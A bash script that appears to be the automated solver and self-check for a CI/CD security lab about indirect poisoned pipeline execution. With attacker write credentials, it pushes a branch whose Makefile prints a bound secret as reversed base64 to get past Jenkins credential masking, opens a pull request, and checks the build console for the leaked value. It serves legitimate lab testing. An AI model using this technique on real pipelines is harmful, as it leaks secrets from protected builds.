#!/bin/bash
# mh-solve: the lab's automated Indirect-PPE solver and self-check (CICD-SEC-4).
#
# Run by Isoloom as an in-machine `exec` check from the Jenkins controller (which can reach Gitea at
# gitea:3000 and Jenkins at 127.0.0.1:8080, and has git + curl). It walks the intended attack
# end-to-end and asserts it still works, so a learner whose box broke is told to reset it:
#
#   1. clone Wonderland/mad-hatter (the APPLICATION repo) with the attacker's WRITE creds (alice)
#   2. create a branch and POISON the MAKEFILE — the build script the protected pipeline runs — so
#      its default target exfiltrates the bound flag3 (`echo "$FLAG" | rev | base64`; reversing
#      before base64 so credential masking does not catch it). The Jenkinsfile itself is untouched:
#      it lives in the separate mad-hatter-pipeline repo the attacker cannot modify.
#   3. push the branch and open a pull request (the SCM-poll trigger then builds it)
#   4. read the branch build's console output and assert the exfiltrated (reversed-base64) flag is there
#
# Exit 0 = solvable. It proves the per-player flag was exfiltrated via the pipeline, but NEVER prints
# the flag (that is the answer the player submits).
set -u

GITEA_HOST="gitea:3000"
GITEA="http://${GITEA_HOST}"
JENKINS="${MH_JENKINS_URL:-http://127.0.0.1:8080}"
ORG="Wonderland"
REPO="mad-hatter"                 # the APPLICATION repo (attacker has WRITE); holds the Makefile
JOB="wonderland-mad-hatter"

ATTACKER="alice:alice"            # the attacker: WRITE access to the application repo
JAUTH="admin:admin"               # a Jenkins user who can read the build console
FLAG_FILE="${MH_FLAG_FILE:-/run/lab/casc_secrets/flag3}"
DEADLINE=$(( $(date +%s) + ${MH_DEADLINE:-420} ))

log()  { echo "mh-solve: $1" >&2; }
fail() { echo "FAIL: $1" >&2; exit 1; }
left() { [ "$(date +%s)" -lt "$DEADLINE" ]; }

# --- the expected exfiltration, computed from the flag the credential store holds -----------------
# Read from the same file JCasC used; never printed. Modern Jenkins credential masking also masks
# the plain base64 of a bound secret, so the poisoned Makefile reverses the value first: `echo
# "$FLAG" | rev | base64`, i.e. base64 of "reverse(<flag>)\n". Reproduce exactly that and search the
# console for it.
[ -s "$FLAG_FILE" ] || fail "flag file $FLAG_FILE is missing or empty"
FLAG="$(tr -d '\r\n' < "$FLAG_FILE")"
[ -n "$FLAG" ] || fail "the staged flag is empty"
EXPECTED="$(printf '%s\n' "$FLAG" | rev | base64 | tr -d '\n')"
[ -n "$EXPECTED" ] || fail "could not compute the expected exfiltration"

jget() { curl -s -m 10 -u "$JAUTH" "$@"; }
jcode() { curl -s -m 10 -o /dev/null -w '%{http_code}' -u "$JAUTH" "$1"; }

# --- 1. wait for Gitea's repo and the Jenkins job to be ready -------------------------------------
log "waiting for the mad-hatter application repository on Gitea..."
until curl -s -m 10 -o /dev/null -w '%{http_code}' -u "$ATTACKER" \
        "$GITEA/api/v1/repos/$ORG/$REPO/branches/main" 2>/dev/null | grep -q '^200$'; do
  left || fail "the Gitea repository never became ready"; sleep 3
done

log "waiting for the Jenkins pipeline job to exist..."
until [ "$(jcode "$JENKINS/job/$JOB/api/json")" = "200" ]; do
  left || fail "the Jenkins job never appeared"; sleep 3
done

# --- 2. clone the application repo, branch, poison the Makefile -----------------------------------
WORK="$(mktemp -d)"; trap 'rm -rf "$WORK"' EXIT
BR="ppe-$(date +%s)-$$"
export GIT_TERMINAL_PROMPT=0 GIT_CONFIG_GLOBAL=/dev/null GIT_CONFIG_SYSTEM=/dev/null
export GIT_AUTHOR_NAME="alice" GIT_AUTHOR_EMAIL="alice@wonderland.example"
export GIT_COMMITTER_NAME="alice" GIT_COMMITTER_EMAIL="alice@wonderland.example"
REMOTE="http://$ATTACKER@$GITEA_HOST/$ORG/$REPO.git"

git clone -q "$REMOTE" "$WORK/repo" || fail "could not clone the application repo (attacker write creds)"
cd "$WORK/repo" || fail "clone directory missing"
git checkout -q -b "$BR"

# Overwrite the Makefile's default target so `make` (run by the protected pipeline with flag3 bound
# as FLAG) exfiltrates the value. The recipe line must start with a real TAB; `$${FLAG}` leaves the
# flag out of the committed file — it is expanded only at build time, in the pipeline's shell.
printf 'check:\n\t@echo "$${FLAG}" | rev | base64\n' > Makefile

git add Makefile
git commit -q -m "build: tidy up the default make target"
git push -q "$REMOTE" "$BR" || fail "could not push the poisoned branch"
log "pushed poisoned branch $BR (Makefile)"

# --- 3. open a pull request (faithful to the upstream challenge; the branch build triggers anyway) -
curl -s -m 10 -o /dev/null -u "$ATTACKER" -X POST -H 'Content-Type: application/json' \
  -d "{\"head\":\"$BR\",\"base\":\"main\",\"title\":\"Tidy up the default make target\"}" \
  "$GITEA/api/v1/repos/$ORG/$REPO/pulls" 2>/dev/null || true

# --- 4. nudge an immediate repository scan (best effort; the 1-minute poll covers it otherwise) ----
scan() {
  local cj cr
  cj="$(mktemp)"
  cr="$(curl -s -m 10 -c "$cj" -u "$JAUTH" \
        "$JENKINS/crumbIssuer/api/xml?xpath=concat(//crumbRequestField,%22%3A%22,//crumb)" 2>/dev/null)"
  [ -n "$cr" ] && curl -s -m 10 -o /dev/null -b "$cj" -u "$JAUTH" -H "$cr" \
        -X POST "$JENKINS/job/$JOB/build" 2>/dev/null
  rm -f "$cj"
}
scan

# --- 5. poll the branch build's console for the exfiltrated flag ----------------------------------
BRANCH_JOB="$JENKINS/job/$JOB/job/$BR"
log "waiting for the pipeline to run branch $BR and exfiltrate the flag..."
nudged=0
while left; do
  console="$(jget "$BRANCH_JOB/lastBuild/consoleText" 2>/dev/null)"
  if printf '%s' "$console" | grep -qF -- "$EXPECTED"; then
    log "OK: the GLOBAL-scope flag3 credential (${#FLAG} chars) was exfiltrated via the poisoned"
    log "    Makefile the protected pipeline ran — the base64 blob is in build ${BR}'s console"
    log "    (flag itself not shown)."
    exit 0
  fi
  nudged=$((nudged+1))
  [ $(( nudged % 6 )) -eq 0 ] && scan   # re-nudge the scan roughly every 30s
  sleep 5
done

fail "the flag did not appear in the pipeline console before the deadline"
